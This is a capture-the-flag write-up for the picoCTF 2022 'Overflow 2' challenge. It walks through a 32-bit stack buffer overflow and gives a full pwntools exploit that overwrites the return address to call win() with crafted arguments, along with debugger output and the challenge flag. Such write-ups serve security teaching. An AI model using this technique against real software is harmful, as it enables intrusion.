Title:  PicoCTF 2022:  Overflow 2
Date: 2022-04-07 23:00
Category: PicoCTF
tags: CTF, picoCTF, write-up, binexp
summary: >
	Write up of the Overflow 2 Challenge from PicoCTF2022
	

# Overflow 2

Overflow 2 was a 300 point challenge from picoCTF 2022, its quit an
interesting one because as well as controlling the program flow, we
need to also control the function arguments sent to the function we
redirect to, Its a nice touch, and good exercise in how the stack
works.


## Looking at the Binary

First up lets take a look at the binay with checksec
As before there are no real protections.

```
[*] '/home/dang/Github/Pico2022/Overflow2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## Teh Codez

Its a pretty standard overflow, however the interesting part is in the win function.

```
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```

So we can overflow the buffer, and jump into the ```win()``` function like we did before.

This time the win function wont just give us the flag.  Instead
win only gives us the flag if we supply the correct function
arguments.


## Exploit Proof of Concept.

As before we need to put a few things in place

  - Offset to control IP
  - Address to jump to
  - Arguments in the correct place.
  
### Getting IP

Adapting the pwntools code from [Buffer Overflow 1]({filename}/picoCTF_2022/Binexp/overflow1.md)
we can use the cyclic function to get the offset to control IP.

```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x62616164 in ?? (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

```

This gives us an offset of **112** bytes

### Getting the Address to Jump to

We can use R2 / Objdump to get the address for the win function.


```
[0x08049180]> pdf @sym.win
/ (fcn) sym.win 162
|   sym.win (uint32_t arg_8h, uint32_t arg_ch);
|           ; var char *format @ ebp-0x4c
|           ; var file*stream @ ebp-0xc
|           ; var int32_t var_4h @ ebp-0x4
|           ; arg uint32_t arg_8h @ ebp+0x8
|           ; arg uint32_t arg_ch @ ebp+0xc
|           0x08049296      f30f1efb       endbr32
|           0x0804929a      55             push ebp
```

### Building the Payload

Now we have the offset an the Address to jump to we need to find a way to get the arguments
passed to the function. In this case we take a ROP like approach.

So our Payload ends up looking something like this

| Element             | Value      |
|---------------------|------------|
| OFFSET              | 112 * "A"  |
| Function Call       | 0x08049296 |
| Fake Return Address | 4 * "B"    |
| Arg 1               | 0xCAFEF00D |
| Arg 2               | 0xF00DF00D |


Giving us a final exploit of 

```
from pwn import *

OFFSET = 112
TARGET = 0x08049296

p = process("./vuln")
#p = remote("saturn.picoctf.net", 49838)

#Initial Rad
data = p.readline()

# CYCLUC
# pause()
#p.writeline(cyclic(200))
#p.interactive()


payload = b"A"*OFFSET
payload += p32(TARGET)
payload += b"BBBB"  #4 Bytes Fake Return Address
payload += p32(0xcafef00d)
payload += p32(0xf00df00d)

p.writeline(payload)
p.interactive()
```


Which gives us the flag

```
dang@danglaptop ~/Github/Pico2022/Overflow2$ python expolit.py            ✭main 
[+] Opening connection to saturn.picoctf.net on port 49838: Done
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ picoCTF{argum3nt5_4_d4yZ_31432deb}[*] Got EOF while reading in interactive
$  
```

